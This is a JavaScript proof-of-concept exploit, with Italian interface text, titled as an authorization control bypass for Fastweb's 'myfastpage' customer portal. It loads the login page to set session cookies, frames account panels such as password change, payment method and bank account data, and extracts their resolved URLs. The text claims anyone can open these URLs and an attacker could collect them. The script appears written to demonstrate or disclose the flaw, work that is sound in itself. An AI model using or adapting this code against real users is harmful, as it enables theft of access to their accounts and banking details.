var panels = {
"var-pwd" : "cambio password di Fastmail e Conto On Line",
"view-cons" : "consumi voce e internet",
"cfg-wifi" : "configurazione wifi",
//"acq-sts" : "acquisto servizi telefonici aggiuntivi",
"var-cmp" : "scelta metodo di pagamento",
//"cfg-ngrg" : "configurazione portmapping della LAN",
//"cfg-software" : "acquisto antivirus e software",
"cfg-wecare-gold" : "deviazioni in caso di guasto",
"cfg-contatti" : "aggiornamento recapiti",
"var-cba" : "vedi dati conto", 
"cfg-consensi" : "configura consensi",
"cfg-db" : "pubblicazione elenco telefonico"
};


var newwindow2=window.open('','name','height=800,width=800');
var tmp = newwindow2.document;

function setIframeSource(name,url)
{
    var myframe = tmp.getElementById('frame-' + name);
    if(myframe != null)  {
         if(myframe.src){ myframe.src = url; }
         else if(myframe.contentWindow !== null && myframe.contentWindow.location !== null){
             myframe.contentWindow.location = url; }
        else{ myframe.setAttribute('src', url); }
    }
    else { alert('1. No frame frame-' + name); }
}

function setText(name,text)
{
    var txt = tmp.getElementById('text-' + name);

    if(txt !== null)  {
         txt.innerHTML=text;
    }
}


function stage1() {

        for (var p in panels) {
           setText(p,'Carico il pannello <strong>\'' + panels[p] + '\'</strong> (' + p + ')...');
           setIframeSource(p,'http://www.fastweb.it/myfastpage/goto/momi/?id=' + p );
           setTimeout('stage2("' + p + '")', 5000);
           
        }

}

function stage2(p) {

           panelframe = tmp.getElementById('frame-' + p);
           if (panelframe != null) {
               if (panelframe.contentWindow.document && panelframe.contentWindow.document.location.href.search('fastmomi')!=-1) {
                     setText(p,'Pannello <strong>\'' + panels[p] + '\'</strong> (' + p + ') caricato. <strong>L\'indirizzo estratto<br/><a href="' + panelframe.contentWindow.document.location.href + '">' + panelframe.contentWindow.document.location.href + '</a> e\' accessibile da chiunque (provate a passarlo a un amico). Sarebbe potuto essere facilmente inviato ad un attaccante esterno. </strong>' );
               }
               else { setText(p,'Non e\' stato possibile sottrarre la url del pannello <strong>\'' + panels[p] + '\'</strong> (' + p + '). Possibili motivi: non sei connesso da rete fastweb, il bug e\' stato corretto, o i timeout sono troppo brevi per la velocita\' della tua connessione. Riprova.'); }       
           }
           else { alert('No frame frame-' + name); }


}

function popitup() {
	//newwindow2=window.open('','name','height=800,width=600');
	//var tmp = newwindow2.document;
	tmp.write('<html><head><title>Fastweb myfastpage autorization control bypass</title>');
	tmp.write('</head><body><center><p><strong>Inizializzo i cookie necessari per le richieste successive... </strong></p><p>Se dentro il frame appare una richiesta di utente e password, probabilmente non ti stai connettendo da una rete fastweb.</p><p> <strong>Attendi qualche secondo...</strong> </p>');
	tmp.write('<iframe id="loginframe" src="http://www.fastweb.it/login" width="100%" height="100"></iframe>');
        
        for (var p in panels) {  
           tmp.write('<p id="text-' + p + '"></p>');
           tmp.write('<iframe id="frame-' + p + '" src="" width="600" height="0"></iframe>'); 
        }
 
	tmp.write('</center></body></html>');
	tmp.close();
}

popitup();
setTimeout("stage1()", 5000);
